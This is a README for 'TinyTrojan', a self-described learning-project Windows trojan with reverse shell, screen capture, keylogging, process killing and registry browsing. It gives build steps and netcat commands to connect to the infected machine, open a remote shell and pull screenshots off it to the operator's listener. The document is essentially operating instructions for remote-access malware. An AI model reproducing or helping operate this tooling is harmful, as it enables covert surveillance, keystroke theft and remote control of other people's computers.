# TinyTrojan

## Description
This is just a small Trojan I wrote when I was learning software security. At present, it has reversed shell, captured the screen, recorded the keyboard, viewed the process, killed the process, and viewed the registry. 

Due to the short time I spent learning programming in Windows environment, the code quality of this project is poor, but I don't intend to continue to optimize it recently. I will rewrite a complete version in the future, ...maybe? lol

## Usage
1. Compile the project
    Just copy it into Visual Studio and compile it.
2. Run the project and connect to the server
    client:
    ```shell
    TinyTrojan.exe
    ```
    server:
    ```shell
    nc [client ip] 11451
    ```
### Command
- `shell` : Get a reverse shell，you should input a port and run another nc to listen it.
    ```shell
    nc [client ip] [another port]
    ```
  - you might need to run `chcp 65001` to change the code page to UTF-8.
- `screenshot` : Capture the screen, save as a BMP file and send it to the server, you should inport a port and run another nc to listen it and save the BMP file by using redirection.
    ```shell
    nc [client ip] [another port] > screenshot.bmp
    ```
- `key` : Record the keyboard and print it to the server. (not finished yet in fact)
- `process` : View all user processes and print it to the server.
- `kill` : Kill a process by PID, you should input a PID.
- `reg` : View the registry in terminal.
  - `ls` : List all subkeys in the current key.
  - `cd` : Change the current key, you should input a key.
  - `query` : List all names in the current key.
  - `cat` : Query the value of a key and print it to the server, you should input a name.
- `exit` : Exit the program.